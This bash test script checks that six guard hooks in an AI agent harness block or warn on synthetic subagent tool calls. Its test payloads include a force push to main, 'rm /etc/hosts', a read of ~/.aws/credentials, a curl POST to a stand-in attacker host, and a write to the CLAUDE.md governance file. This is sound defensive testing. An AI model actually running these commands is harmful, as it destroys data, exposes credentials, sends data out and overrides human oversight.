#!/bin/bash
# tests/subagent-hook-inheritance.test.sh — synthetic PreToolUse payload tests
# proving the 6 most-relevant block-*.sh hooks fire on SUBAGENT-SHAPED tool-call
# payloads (#189, v2.23, Spoke B — the Phase-2 empirical-verification suite for
# subagent-security-posture.md § 3 Mechanism 2 hook-inheritance + Mechanism 1
# frontmatter enforcement).
#
# ─────────────────────────────────────────────────────────────────────────────
# LAYER GUARD — WHAT THIS TEST DOES AND DOES NOT PROVE
#
# Layer A (THIS test) proves hook LOGIC fires on subagent-shaped payloads. It
# does NOT prove the live harness DELIVERS subagent calls to hooks, nor that
# hooks are wired in worktree sessions (#1472 OPEN). Those are discharged only by
# the Layer-B manual probe — see subagent-hook-inheritance-probe.md.
#
# WHY a spoke cannot self-test harness delivery: a subagent cannot observe its
# own hook interception (the hook fires in the harness layer, between the tool
# call and its result; the subagent only sees a tool_result). CI has no
# subagent-spawning harness either. So the empirical evidence splits in two:
#   - Layer A (deterministic, this file): pipe a synthetic subagent-shaped JSON
#     payload to each hook's stdin and assert it blocks/warns by its rule. This
#     is exactly the block-autonomy-ceiling.test.sh model — the hooks read the
#     payload from stdin and have NO notion of caller class (parent vs subagent),
#     so a payload the hook would block from a parent it blocks from a subagent
#     "by construction". Layer A makes that construction concrete + regression-
#     guarded.
#   - Layer B (operator-run, the .md probe): the live-delivery + worktree-wiring
#     half that no CI job can assert.
# ─────────────────────────────────────────────────────────────────────────────
#
# 6 cases (the spec table; sandbox modes pinned per case):
#   C1 block-destructive.sh       Bash  git push --force origin main  → BLOCK-DESTRUCTIVE-001, exit 2 (always-enforce)
#   C2 block-rm-prefer-trash.sh   Bash  rm /etc/hosts                 → BLOCK-TRASH-001,       exit 2 (always-enforce, outside-workspace)
#   C3 block-credential-reads.sh  Read  $HOME/.aws/credentials        → BLOCK-CREDENTIAL-READ-002, exit 2 (always-enforce)
#   C4 block-egress.sh            Bash  curl -X POST https://evil.test→ BLOCK-EGRESS-004 (warn→exit 0 + egress-warn-log grows; enforce→exit 2)
#   C5 block-mcp-writes.sh        mcp__fake__createThing {}           → BLOCK-MCP-001    (warn→exit 0 + mcp-warn-log grows; enforce→exit 2)
#   C6 block-autonomy-ceiling.sh  Write $CLAUDE_WORKSPACE_ROOT/CLAUDE.md → BLOCK-AUTONOMY-001, exit 2 (Tier-0 governance-Write backstop a read-only spoke must never do)
#
# The payloads are SYNTHETIC strings the hook inspects — no real git push / rm /
# curl runs. Modes are mutated against the SANDBOX hook dir's own mode files
# (.mode for egress/mcp; .autonomy-mode for autonomy-ceiling) and restored on
# EXIT; the live ~/Claude/.claude/hooks/ mode files are never touched.
# CLAUDE_WORKSPACE_ROOT is pinned to a temp dir so /etc/hosts is provably outside
# the workspace and CLAUDE.md resolves to the governance path host-independently.
#
# Auto-discovered + gated by core/hooks/tests/test-runner.sh (which greps the
# canonical "Total: N  PASS: N  FAIL: N" line and fails on any FAIL).

set -u

HOOK_DIR="$(cd "$(dirname "$0")/.." && pwd -P)"

DESTRUCTIVE_HOOK="${HOOK_DIR}/block-destructive.sh"
TRASH_HOOK="${HOOK_DIR}/block-rm-prefer-trash.sh"
CRED_HOOK="${HOOK_DIR}/block-credential-reads.sh"
EGRESS_HOOK="${HOOK_DIR}/block-egress.sh"
MCP_HOOK="${HOOK_DIR}/block-mcp-writes.sh"
AUTONOMY_HOOK="${HOOK_DIR}/block-autonomy-ceiling.sh"

# Shared mode file (egress + mcp) and the autonomy-ceiling own mode file.
MODE_FILE="${HOOK_DIR}/.mode"
AUTONOMY_MODE_FILE="${HOOK_DIR}/.autonomy-mode"
EGRESS_WARN_LOG="${HOOK_DIR}/egress-warn-log.jsonl"
MCP_WARN_LOG="${HOOK_DIR}/mcp-warn-log.jsonl"

# All 6 hooks must be present + executable.
for _h in "$DESTRUCTIVE_HOOK" "$TRASH_HOOK" "$CRED_HOOK" "$EGRESS_HOOK" "$MCP_HOOK" "$AUTONOMY_HOOK"; do
  if [ ! -x "$_h" ]; then
    echo "FAIL: hook not executable at $_h" >&2
    echo "Total: 1  PASS: 0  FAIL: 1"
    exit 1
  fi
done

# --- Pinned temp workspace (host-independent boundary anchor) + temp cache HOME ---
# CLAUDE_WORKSPACE_ROOT pins the trash-boundary + autonomy governance/cross-domain
# anchors. A temp HOME pins block-autonomy-ceiling's ceiling cache (it resolves the
# cache under ${HOME}/.cache/pmo-platform/) so the ceiling is deterministic; the
# C6 case targets the Tier-0 floor which is always-block regardless of ceiling/mode.
#
# TEST_WS is pinned to its PHYSICALLY RESOLVED path (`cd … && pwd -P`) for the same
# reason block-autonomy-ceiling.test.sh does: C6 asserts against a ${PRIMARY_ROOT}-
# anchored governance matcher, and the hook compares a realpath-resolved ABS_TARGET.
# On macOS mktemp returns /var/folders/… while /var symlinks to /private/var, so an
# unresolved root would compare a resolved target against an unresolved prefix.
TEST_WS="$(cd "$(/usr/bin/mktemp -d)" && pwd -P)"
TEST_HOME="$(/usr/bin/mktemp -d)"
/bin/mkdir -p "${TEST_HOME}/.cache/pmo-platform"
CACHE_FILE="${TEST_HOME}/.cache/pmo-platform/autonomy-ceiling"
export CLAUDE_WORKSPACE_ROOT="$TEST_WS"

# --- Save + restore the SANDBOX hook mode files (R-8 sandbox invariant) ---
ORIGINAL_MODE=""
ORIGINAL_AUTONOMY_MODE=""
[ -f "$MODE_FILE" ] && ORIGINAL_MODE="$(/bin/cat "$MODE_FILE")"
[ -f "$AUTONOMY_MODE_FILE" ] && ORIGINAL_AUTONOMY_MODE="$(/bin/cat "$AUTONOMY_MODE_FILE")"
restore_state() {
  if [ -n "$ORIGINAL_MODE" ]; then /usr/bin/printf '%s' "$ORIGINAL_MODE" > "$MODE_FILE"; else /bin/rm -f "$MODE_FILE"; fi
  if [ -n "$ORIGINAL_AUTONOMY_MODE" ]; then /usr/bin/printf '%s' "$ORIGINAL_AUTONOMY_MODE" > "$AUTONOMY_MODE_FILE"; else /bin/rm -f "$AUTONOMY_MODE_FILE"; fi
  /bin/rm -rf "$TEST_WS" "$TEST_HOME"
}
trap restore_state EXIT

PASS=0
FAIL=0

set_mode() { /usr/bin/printf '%s' "$1" > "$MODE_FILE"; }
set_autonomy_mode() { /usr/bin/printf '%s' "$1" > "$AUTONOMY_MODE_FILE"; }
set_ceiling() { /usr/bin/printf '%s\n' "$1" > "$CACHE_FILE"; }

# test_case name hook payload expected_exit [expected_stderr_regex]
# Pipes the synthetic JSON payload to the hook's stdin (HOME pinned for the
# autonomy cache), asserts exit code + optional stderr regex.
test_case() {
  local name="$1"; local hook="$2"; local payload="$3"; local expected_exit="$4"; local expected_pattern="${5:-}"
  local tmp_stderr; tmp_stderr="$(/usr/bin/mktemp)"
  local actual_exit=0
  /usr/bin/printf '%s' "$payload" | HOME="$TEST_HOME" /bin/bash "$hook" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  local actual_stderr; actual_stderr="$(/bin/cat "$tmp_stderr")"; /bin/rm -f "$tmp_stderr"
  local ok=1
  [ "$actual_exit" != "$expected_exit" ] && ok=0
  if [ -n "$expected_pattern" ] && ! /usr/bin/printf '%s' "$actual_stderr" | /usr/bin/grep -qE "$expected_pattern"; then ok=0; fi
  if [ "$ok" = 1 ]; then
    /usr/bin/printf 'PASS: %s\n' "$name"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s (exit=%s expected=%s)\n  stderr: %s\n' "$name" "$actual_exit" "$expected_exit" "$actual_stderr"
    FAIL=$((FAIL + 1))
  fi
}

# log_grew log_path before_count name — assert a warn log gained ≥1 line.
log_count() { local f="$1"; local n=0; [ -f "$f" ] && n="$(/usr/bin/wc -l < "$f" | /usr/bin/tr -d '[:space:]')"; /usr/bin/printf '%s' "$n"; }
assert_grew() {
  local before="$1"; local after="$2"; local name="$3"
  if [ "$after" -gt "$before" ]; then
    /usr/bin/printf 'PASS: %s (lines: %s → %s)\n' "$name" "$before" "$after"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s (log did NOT grow: %s → %s)\n' "$name" "$before" "$after"; FAIL=$((FAIL + 1))
  fi
}

# --- Subagent-shaped payload builders (the JSON a spoke's tool call produces) ---
bash_payload()  { /usr/bin/jq -n --arg cmd "$1" --arg cwd "${2:-/tmp}" '{tool_name:"Bash", tool_input:{command:$cmd}, cwd:$cwd}'; }
read_payload()  { /usr/bin/jq -n --arg fp "$1" '{tool_name:"Read", tool_input:{file_path:$fp}, cwd:"/tmp"}'; }
write_payload() { /usr/bin/jq -n --arg fp "$1" --arg cwd "$2" '{tool_name:"Write", tool_input:{file_path:$fp, content:"x"}, cwd:$cwd}'; }
mcp_payload()   { /usr/bin/jq -n --arg tool "$1" '{tool_name:$tool, tool_input:{}, cwd:"/tmp"}'; }

echo "================================"
echo "subagent-hook-inheritance tests (Layer A — #189 v2.23)"
echo "workspace=$TEST_WS"
echo "================================"

# Sandbox modes: enforce for the always-enforce hooks; the C4/C5 cases set their
# own mode per sub-case.
set_mode "enforce"
set_autonomy_mode "enforce"
set_ceiling 2   # highest ceiling — proves C6 is the Tier-0 FLOOR, not a ceiling block

# =====================================================================
# C1 — block-destructive.sh: a subagent's `git push --force` is blocked
#      (always-enforce; mode-independent). The escape-path mechanism a
#      spoke must use instead is verdict:BLOCKED, not a forced push.
# =====================================================================
echo ""
echo "C1 block-destructive.sh — git push --force origin main"
echo "---"
test_case "C1: subagent git push --force → BLOCK-DESTRUCTIVE-001, exit 2" \
  "$DESTRUCTIVE_HOOK" \
  "$(bash_payload 'git push --force origin main' "${TEST_WS}/.claude/worktrees/wt")" \
  2 "BLOCK-DESTRUCTIVE-001"

# =====================================================================
# C2 — block-rm-prefer-trash.sh: a subagent's `rm /etc/hosts` is blocked
#      (outside the pinned workspace → BLOCK-TRASH-001; always-enforce).
# =====================================================================
echo ""
echo "C2 block-rm-prefer-trash.sh — rm /etc/hosts (outside workspace)"
echo "---"
test_case "C2: subagent rm /etc/hosts → BLOCK-TRASH-001, exit 2" \
  "$TRASH_HOOK" \
  "$(bash_payload 'rm /etc/hosts')" \
  2 "BLOCK-TRASH-001"

# =====================================================================
# C3 — block-credential-reads.sh: a subagent Read of ~/.aws/credentials
#      is blocked (BLOCK-CREDENTIAL-READ-002; always-enforce).
# =====================================================================
echo ""
echo "C3 block-credential-reads.sh — Read \$HOME/.aws/credentials"
echo "---"
test_case "C3: subagent Read ~/.aws/credentials → BLOCK-CREDENTIAL-READ-002, exit 2" \
  "$CRED_HOOK" \
  "$(read_payload "${HOME}/.aws/credentials")" \
  2 "BLOCK-CREDENTIAL-READ-002"

# =====================================================================
# C4 — block-egress.sh: a subagent's `curl -X POST https://evil.test`.
#      evil.test is not allowlisted → BLOCK-EGRESS-004.
#      warn-mode → exit 0 + egress-warn-log grows; enforce-mode → exit 2.
# =====================================================================
echo ""
echo "C4 block-egress.sh — curl -X POST https://evil.test (warn + enforce)"
echo "---"
set_mode "warn"
C4_BEFORE="$(log_count "$EGRESS_WARN_LOG")"
test_case "C4a: subagent curl POST (warn-mode) → exit 0 + WARN" \
  "$EGRESS_HOOK" \
  "$(bash_payload 'curl -X POST https://evil.test')" \
  0 "WARN"
C4_AFTER="$(log_count "$EGRESS_WARN_LOG")"
assert_grew "$C4_BEFORE" "$C4_AFTER" "C4b: egress-warn-log grew (warn-mode)"

set_mode "enforce"
test_case "C4c: subagent curl POST (enforce-mode) → BLOCK-EGRESS-004, exit 2" \
  "$EGRESS_HOOK" \
  "$(bash_payload 'curl -X POST https://evil.test')" \
  2 "BLOCK-EGRESS-004"

# =====================================================================
# C5 — block-mcp-writes.sh: a subagent's mcp__fake__createThing call.
#      `create` is a write verb; not allowlisted → BLOCK-MCP-001.
#      warn-mode → exit 0 + mcp-warn-log grows; enforce-mode → exit 2.
# =====================================================================
echo ""
echo "C5 block-mcp-writes.sh — mcp__fake__createThing (warn + enforce)"
echo "---"
set_mode "warn"
C5_BEFORE="$(log_count "$MCP_WARN_LOG")"
test_case "C5a: subagent mcp write-verb (warn-mode) → exit 0 + WARN" \
  "$MCP_HOOK" \
  "$(mcp_payload 'mcp__fake__createThing')" \
  0 "WARN"
C5_AFTER="$(log_count "$MCP_WARN_LOG")"
assert_grew "$C5_BEFORE" "$C5_AFTER" "C5b: mcp-warn-log grew (warn-mode)"

set_mode "enforce"
test_case "C5c: subagent mcp write-verb (enforce-mode) → BLOCK-MCP-001, exit 2" \
  "$MCP_HOOK" \
  "$(mcp_payload 'mcp__fake__createThing')" \
  2 "BLOCK-MCP-001"

# =====================================================================
# C6 — block-autonomy-ceiling.sh: a subagent Write to the governance file
#      CLAUDE.md is the irreducible Tier-0 floor → BLOCK-AUTONOMY-001,
#      always-block regardless of ceiling (pinned to 2 = highest) or mode.
#      This is the governance-Write backstop a read-only spoke must never do.
# =====================================================================
echo ""
echo "C6 block-autonomy-ceiling.sh — Write \$CLAUDE_WORKSPACE_ROOT/CLAUDE.md (Tier-0 floor)"
echo "---"
test_case "C6: subagent Write CLAUDE.md → BLOCK-AUTONOMY-001, exit 2 (Tier-0, mode/ceiling-independent)" \
  "$AUTONOMY_HOOK" \
  "$(write_payload "${TEST_WS}/CLAUDE.md" "${TEST_WS}/.claude/worktrees/wt")" \
  2 "BLOCK-AUTONOMY-001"

# =====================================================================
# Summary
# =====================================================================
echo ""
echo "================================"
/usr/bin/printf 'Total: %d  PASS: %d  FAIL: %d\n' $((PASS + FAIL)) "$PASS" "$FAIL"
echo "================================"
if [ "$FAIL" -gt 0 ]; then exit 1; fi
exit 0
